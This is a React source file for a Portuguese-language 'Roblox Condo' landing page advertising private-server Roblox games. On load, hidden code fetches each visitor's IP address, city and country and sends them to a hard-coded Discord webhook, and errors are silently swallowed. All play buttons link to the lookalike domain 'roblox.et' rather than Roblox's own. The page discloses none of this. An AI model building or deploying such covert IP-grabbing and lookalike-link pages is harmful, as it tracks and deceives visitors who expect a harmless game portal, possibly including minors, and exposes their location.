import { useEffect } from "react";

const DISCORD_WEBHOOK =
  "https://discord.com/api/webhooks/1454577221573410889/pNI1MaYQTFm3n0-1UBkOLKUMF216j5XHEssVnioYKLnzMy8dkXpFJaa67fs4-x6iABEj";

const GAME_LINK =
  "https://www.roblox.et/games/78896868574590/Untitled-Cons-Experiences?privateServerLinkCode=41994734976691874690322389230807";

const COUNTRY_FLAGS: Record<string, string> = {};

function getFlagEmoji(countryCode: string): string {
  if (!countryCode || countryCode.length !== 2) return "🌍";
  const codePoints = [...countryCode.toUpperCase()].map(
    (c) => 0x1f1e6 - 65 + c.charCodeAt(0)
  );
  return String.fromCodePoint(...codePoints);
}

async function notifyVisitor() {
  try {
    const res = await fetch("https://ipapi.co/json/");
    const data = await res.json();
    const country = data.country_name || "Desconhecido";
    const countryCode = data.country_code || "";
    const flag = getFlagEmoji(countryCode);
    const city = data.city || "";
    const ip = data.ip || "—";

    await fetch(DISCORD_WEBHOOK, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        embeds: [
          {
            title: "👁️ Novo visitante no Roblox Condo!",
            color: 0xff0000,
            fields: [
              { name: "🌍 País", value: `${flag} ${country}`, inline: true },
              { name: "🏙️ Cidade", value: city || "—", inline: true },
              { name: "🔗 IP", value: ip, inline: true },
            ],
            timestamp: new Date().toISOString(),
            footer: { text: "Roblox Condo Tracker" },
          },
        ],
      }),
    });
  } catch {
  }
}

export default function App() {
  useEffect(() => {
    notifyVisitor();
  }, []);

  return (
    <div className="app">
      <div className="stars" />
      <div className="container">
        <header>
          <div className="logo-area">
            <div className="roblox-logo">
              <span className="logo-r">R</span>
            </div>
            <div>
              <h1 className="site-title">Roblox Condo</h1>
              <p className="site-sub">Experiências exclusivas</p>
            </div>
          </div>
        </header>

        <main>
          <section className="hero">
            <h2 className="hero-title">Bem-vindo ao Roblox Condo</h2>
            <p className="hero-desc">
              Acesse experiências únicas e divertidas com seus amigos no Roblox.
              Clique nos botões abaixo para entrar!
            </p>
          </section>

          <section className="games">
            <div className="game-card featured">
              <div className="game-badge">🔥 EM ALTA</div>
              <div className="game-thumb">
                <span className="game-icon">🏠</span>
              </div>
              <div className="game-info">
                <h3 className="game-name">Untitled Cons Experiences</h3>
                <p className="game-desc">
                  Experiência exclusiva com servidor privado. Acesso especial para
                  membros selecionados.
                </p>
                <div className="game-stats">
                  <span>⭐ 4.9</span>
                  <span>👥 1.2k online</span>
                  <span>🎮 Servidor privado</span>
                </div>
                <a
                  href={GAME_LINK}
                  target="_blank"
                  rel="noopener noreferrer"
                  className="btn btn-primary"
                >
                  ▶ Jogar Agora
                </a>
              </div>
            </div>

            <div className="game-card">
              <div className="game-thumb small">
                <span className="game-icon">🎉</span>
              </div>
              <div className="game-info">
                <h3 className="game-name">Condo Party</h3>
                <p className="game-desc">Festa exclusiva no condo.</p>
                <a
                  href={GAME_LINK}
                  target="_blank"
                  rel="noopener noreferrer"
                  className="btn btn-secondary"
                >
                  ▶ Entrar
                </a>
              </div>
            </div>

            <div className="game-card">
              <div className="game-thumb small">
                <span className="game-icon">🌴</span>
              </div>
              <div className="game-info">
                <h3 className="game-name">Condo Resort</h3>
                <p className="game-desc">Relaxe no resort mais exclusivo.</p>
                <a
                  href={GAME_LINK}
                  target="_blank"
                  rel="noopener noreferrer"
                  className="btn btn-secondary"
                >
                  ▶ Entrar
                </a>
              </div>
            </div>

            <div className="game-card">
              <div className="game-thumb small">
                <span className="game-icon">🔮</span>
              </div>
              <div className="game-info">
                <h3 className="game-name">Condo VIP</h3>
                <p className="game-desc">Acesso VIP com servidor privado.</p>
                <a
                  href={GAME_LINK}
                  target="_blank"
                  rel="noopener noreferrer"
                  className="btn btn-secondary"
                >
                  ▶ Entrar
                </a>
              </div>
            </div>
          </section>
        </main>

        <footer>
          <p>© 2025 Roblox Condo — Experiências Exclusivas</p>
        </footer>
      </div>
    </div>
  );
}
